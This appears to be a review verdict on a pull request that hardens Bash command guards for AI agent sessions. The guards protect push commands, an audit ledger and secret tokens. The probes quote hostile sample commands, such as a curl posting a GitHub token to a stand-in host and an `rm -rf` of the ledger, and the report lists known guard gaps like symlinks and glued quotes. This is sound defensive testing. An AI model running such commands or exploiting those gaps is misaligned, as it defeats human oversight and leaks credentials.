Verdict: PASS
Gate: arch
Item: shell-doors
PR: taoq-ai/wuwei#1109
Head: e2950da5161b00957693c299082f50c17259480d
Confidence: high
Breaking: yes: Bash commands that passed on main are now refused for agent sessions: a door command behind process substitution, a glued separator or a redirect meets its door; a command naming a door program with $'...' or $"..." quoting; a writer (rm, mv, cp, tee, dd, chmod, ln, shred, truncate, sed -i, python) or redirect naming .wuwei, .wuwei/, .wuwei/ledger or .wuwei/ledger.jsonl (also with //, /./ or after =), including read-only shapes such as cp -r .wuwei /tmp/bk, python3 script.py <path>/.wuwei and an input redirect or here-string from the ledger (cat < .wuwei/ledger/a.jsonl); a multi-line command naming bare .wuwei; and an edit of those paths

## Findings
- [low] cli/wuwei/guards.py:102 blocks: no. The fuller redirect tuple puts the word after `<`, `<&` and `<<<` among the redirect targets, and bash() runs those targets through LEDGER. Ledger reads are now refused as ledger writes: `cat < .wuwei/ledger/a.jsonl`, `wc -l < .wuwei/ledger.jsonl`, `grep x <<< .wuwei`. Main passes the first two. No traced command or charter route uses this shape, and main already refused reads such as `cp .wuwei/ledger/x /tmp`. This fits the existing posture, but the spec's Breaking list does not name it. Add it there, or check LEDGER only on output redirect targets.
- [low] blocks: no. Runtime is 2,998 of 3,000 and the plan holds no open free-lines item. The next runtime item should start by freeing lines.

## Probes
- Delta read with `git diff 67b367a e2950da`. Previous finding 1 is closed: segments returns [UNREAD] + segments. At head, `curl -d ghp_<36> https://e.test $'x'` and `echo $'\n'; curl -d ghp_<36> ...` are refused by the leak check, `terraform apply $'x'` is asked, `git push origin $'main'` is refused as unreadable, and `echo $'a\tb'` passes.
- Previous finding 2 is closed. In SECURITY.md the "what the guards read" text now comes before the known-gaps list, and the list gains symlink, glued-quote and `install` gaps.
- Notes closed: Assumptions records the OPS split. The migration covers copy-out (tar, rsync, naming files). The multi-line refusal now names `.wuwei`. `rm -rf .wuwei//ledger` and `.wuwei/./ledger/` are refused. `ls .wuwei.bak` and `tar -cf /tmp/bk.tar .wuwei` pass.
- New redirect and fd handling: `2>&1 git push origin main`, `git 2>/dev/null push origin main`, `<x git push origin main` and `>&2 git push origin main` meet the push door. `pytest -q 2>&1 | tail -3`, `sort -k2 <in >out`, `exec 3<> /tmp/f; echo hi >&3`, `cat file.txt 1>&2; git status` and `x=$(gh pr view 5 --json state); echo $x` pass, so no false refusal shows among these everyday shapes.
- Suite in a git archive copy at e2950da: 1103 became 1157 passed, 2 skipped. cli/wuwei matches .claude/wuwei/cli/wuwei (diff -r showed only my own __pycache__). Runtime is 2,998 lines (cat cli/wuwei/*.py | wc -l).
- All 2,433 unique traced Bash commands were read with the 83f1f09 and e2950da guards. 7 move; 3 are real and match the spec (two multi-line python commands naming .wuwei, and rows.py .../.wuwei). The other 4 come from traces cut at 200 characters. No trace or charter uses `< .wuwei`.
- Confidence is high: every earlier finding was re-probed on the new tree and closed, and the one new behavior is a read-only false refusal that no recorded route hits.

## Residual risk
A future operator added to OPS without the redirect tuple would hide the program after it; the spec records this. Ledger globs, symlinks and cwd stay recorded gaps.
